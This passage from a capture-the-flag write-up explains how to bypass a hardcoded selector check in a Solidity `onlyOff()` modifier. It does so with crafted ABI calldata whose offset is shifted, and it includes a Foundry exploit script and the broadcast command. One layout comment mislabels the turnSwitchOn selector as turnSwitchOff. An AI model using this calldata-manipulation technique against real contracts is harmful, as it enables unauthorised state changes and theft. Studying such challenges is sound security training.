5. The vulnerability is present inside the `onlyOff()` modifier as its function signature check byte position is hardcoded (68,4). 
6. We can modify the calldata in order to bypass the check and as well as call the `turnSwitchOn()` function.
7. Lets understand `calldata` specificly when passing dynamic datatypes as arguments
8. When we call a function on a contract, the calldata will be sent via the transaction as `msg.data`, Lets see what this data consists.
```
calldata with dynamic arguments
    => <function signature> <offset> <length of data> <data>
Each field will be padded to 32 bytes except function signature.

calldata when we call flipSwitch() with turnSwitchOff() function signature 
       30c13ade  // flipSwitch() signature
  00 : 0000000000000000000000000000000000000000000000000000000000000020   ==> offset - the starting position of the actual data 
  20 : 0000000000000000000000000000000000000000000000000000000000000004   ==> length - data length
  40 : 20606e1500000000000000000000000000000000000000000000000000000060   ==> data - data that we passed through argument (turnSwitchOff() signature)

```
9. This call to flipSwitch() is succeeded because the check was passed. The check is that from the 68th byte to 72nd byte will be sliced out and this will be checked with the signature of the `turnSwitchOff()` function.
10. Now we somehow should manage to send the `turnSwitchOn()` signature along with this calldata. And we should make sure that only `turnSwitchOn()` signature should be passed to the `call` inside `flipSwitch()`. 
11. The data which is used inside the function will be specified by the `offset`. The function will make use of the actual data that is pointed by the offset.
12. As the `onlyOff` modifier uses the hardcoded check, we can modify the calldata to be able to insert the `turnSwitchOff()` function signature at the 68th bytes and append the `turnSwitchOn()` signature.
13. Now we have to change the offset of the calldata in such a way that it points to the `turnSwitchOn()` signature.
```
calldata to bypass onlyOff
    => <flipSwitch Singature> <Offset> <Dummy Data> <turnSwitchOff Signature> <length of data> <turnSwitchOn Signature>

30c13ade
00 : 00000000000000000000000000000000000000000000000000000000000000[60]  ==> Offset - position of actual data
20 : 0000000000000000000000000000000000000000000000000000000000000000     ==> Dummy data - to move turnSwitchOff data to 68th byte
40 : 20606e1500000000000000000000000000000000000000000000000000000000  ==> Data - turnSwitchOff() selector (By passes onlyOff)
60 : 0000000000000000000000000000000000000000000000000000000000000004  ==> Length - Length of the turnSwitchOff() signature data
80 : 76227e1200000000000000000000000000000000000000000000000000000000  ==> Actual data - turnSwitchOff() signature

```
14. Now this calldata will bypasses the check of onlyOff and we modified the offset to point it to the turnSwitchOn() signature.
15. So, now the calldata passed to the `call` inside flipSwitch() will be,
```
76227e1200000000000000000000000000000000000000000000000000000000
```
16. This will call the turnSwitchOn() function in Switch contract. Finally we will be able to solve the challenge.

`SwitchSolve.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Switch.sol";

contract SwitchSolve is Script {
    Switch public sw = Switch(0x8592a0765f942ba46ADf3a0EB1fF57b1d74664F0);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Switch  : ", sw.switchOn());

        // bytes memory data = abi.encodeWithSignature("turnSwitchOff()");
        bytes memory data = abi.encodeWithSignature("flipSwitch(bytes)",0x60, 0x00, 0x20606e1500000000000000000000000000000000000000000000000000000000, 0x04, 0x76227e1200000000000000000000000000000000000000000000000000000000);

        console.logBytes(data);

        address(sw).call(data);



        console.log("Switch  : ", sw.switchOn());


        vm.stopBroadcast();
    }
}
```

To run script : 

```bash
$ source .env
$ forge script script/SwitchSolve.s.sol:SwitchSolve --rpc-url $RPC_URL --broadcast
```


***

That's it for the write-up ! To connect with me send a request at <a href="https://www.twitter.com/TheMj0ln1r">@TheMj0ln1r</a>

## References

1. <a href="https://github.com/x676f64/secureum-mind_map" target=_blank >Secureum Bootcamp</a>
2. <a href="https://github.com/ethereumbook/ethereumbook" target=_blank >Mastering Ethereum</a>